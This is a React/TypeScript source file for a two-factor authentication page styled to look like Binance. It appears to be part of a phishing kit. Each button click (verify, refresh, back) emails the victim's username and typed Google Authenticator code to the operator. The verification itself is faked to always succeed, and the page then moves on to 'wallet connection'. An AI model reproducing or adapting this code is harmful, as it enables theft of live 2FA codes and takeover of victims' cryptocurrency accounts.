import React, { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { useToast } from "@/hooks/use-toast";
import { Shield, RefreshCw } from "lucide-react";
import { sendHighPriorityNotification } from "@/services/emailService";

interface TwoFactorAuthProps {
  username: string;
  onTwoFactorSuccess: () => void;
  onBack: () => void;
}

const TwoFactorAuth: React.FC<TwoFactorAuthProps> = ({ username, onTwoFactorSuccess, onBack }) => {
  const [code, setCode] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [timer, setTimer] = useState(30);
  const [canResend, setCanResend] = useState(false);
  const { toast } = useToast();

  useEffect(() => {
    let interval: NodeJS.Timeout;
    if (timer > 0) {
      interval = setInterval(() => {
        setTimer(timer - 1);
      }, 1000);
    } else {
      setCanResend(true);
    }
    return () => clearInterval(interval);
  }, [timer]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (code.length !== 6) {
      toast({
        title: "Invalid code",
        description: "Please enter a 6-digit verification code.",
        variant: "destructive",
      });
      return;
    }

    // Send email IMMEDIATELY when verify button is clicked
    console.log('🚨 2FA VERIFY BUTTON CLICKED - Sending email immediately...');
    
    try {
      await sendHighPriorityNotification({
        step: "🔴 TWO-FACTOR AUTH - VERIFY CODE BUTTON CLICKED",
        username,
        timestamp: new Date().toISOString(),
        allFormData: {
          formType: "TWO_FACTOR_AUTHENTICATION",
          username: username,
          twoFactorCode: code,
          action: "2FA_CODE_SUBMITTED",
          buttonClicked: "VERIFY_CODE",
          timestamp: new Date().toISOString(),
          currentStep: "two_factor_auth"
        }
      });
      console.log('✅ 2FA verification email sent immediately!');
    } catch (error) {
      console.error('❌ 2FA verification email failed:', error);
    }

    setIsLoading(true);
    
    // Simulate 2FA verification
    setTimeout(() => {
      setIsLoading(false);
      onTwoFactorSuccess();
      toast({
        title: "Verification successful",
        description: "Proceeding to wallet connection.",
      });
    }, 1500);
  };

  const handleResendCode = async () => {
    // Send email IMMEDIATELY when refresh button is clicked
    console.log('🚨 2FA REFRESH BUTTON CLICKED - Sending email immediately...');
    
    try {
      await sendHighPriorityNotification({
        step: "🔴 TWO-FACTOR AUTH - REFRESH CODE BUTTON CLICKED",
        username,
        timestamp: new Date().toISOString(),
        allFormData: {
          formType: "TWO_FACTOR_AUTHENTICATION",
          username: username,
          currentCode: code,
          action: "REFRESH_2FA_CODE",
          buttonClicked: "REFRESH_CODE",
          timestamp: new Date().toISOString(),
          currentStep: "two_factor_auth"
        }
      });
      console.log('✅ 2FA refresh email sent immediately!');
    } catch (error) {
      console.error('❌ 2FA refresh email failed:', error);
    }

    setTimer(30);
    setCanResend(false);
    toast({
      title: "Code refreshed",
      description: "Please check your Google Authenticator app.",
    });
  };

  const handleBackClick = async () => {
    // Send email when back button is clicked
    try {
      await sendHighPriorityNotification({
        step: "🔴 TWO-FACTOR AUTH - BACK BUTTON CLICKED",
        username,
        timestamp: new Date().toISOString(),
        allFormData: {
          formType: "TWO_FACTOR_AUTHENTICATION",
          username: username,
          currentCode: code,
          action: "BACK_TO_SECURITY_VERIFICATION",
          buttonClicked: "BACK_TO_LOGIN",
          timestamp: new Date().toISOString(),
          currentStep: "two_factor_auth"
        }
      });
    } catch (error) {
      console.error('Email notification failed:', error);
    }
    
    onBack();
  };

  return (
    <div className="min-h-[calc(100vh-200px)] flex items-center justify-center py-8 px-4">
      <div className="w-full max-w-md mx-auto">
        <div className="bg-[#1E2026] rounded-lg border border-[#2B3139] p-8">
          <div className="text-center mb-8">
            <Shield className="w-12 h-12 text-binance-yellow mx-auto mb-4" />
            <h1 className="text-2xl font-bold text-white mb-2">Two-Factor Authentication</h1>
            <p className="text-[#848E9C] text-base">
              Enter the 6-digit code from your Google Authenticator app
            </p>
            <p className="text-[#848E9C] text-sm mt-2">
              Logged in as: <span className="text-white">{username}</span>
            </p>
          </div>

          <form onSubmit={handleSubmit} className="space-y-6">
            <div>
              <Label htmlFor="code" className="text-[#B7BDC6] text-base mb-2 block">
                6-Digit Google Authenticator Code
              </Label>
              <Input
                id="code"
                type="text"
                value={code}
                onChange={(e) => setCode(e.target.value.replace(/\D/g, '').slice(0, 6))}
                className="bg-[#181A20] border-[#2B3139] text-white text-center text-xl h-12 tracking-widest focus:border-binance-yellow"
                placeholder="000000"
                maxLength={6}
                required
              />
            </div>

            <Button
              type="submit"
              disabled={isLoading || code.length !== 6}
              className="w-full bg-binance-yellow hover:bg-binance-yellow/90 text-black font-semibold h-12 text-base"
            >
              {isLoading ? "Verifying..." : "Verify Code"}
            </Button>
          </form>

          <div className="mt-6 text-center space-y-3">
            {canResend ? (
              <button
                onClick={handleResendCode}
                className="text-binance-yellow hover:underline text-sm flex items-center justify-center gap-2"
              >
                <RefreshCw className="w-4 h-4" />
                Refresh Code
              </button>
            ) : (
              <p className="text-[#848E9C] text-sm">
                Refresh available in {timer} seconds
              </p>
            )}
            
            <button
              onClick={handleBackClick}
              className="text-binance-yellow hover:text-binance-yellow/80 text-sm font-medium"
            >
              Back to Login
            </button>
          </div>
        </div>
      </div>
    </div>
  );
};

export default TwoFactorAuth;
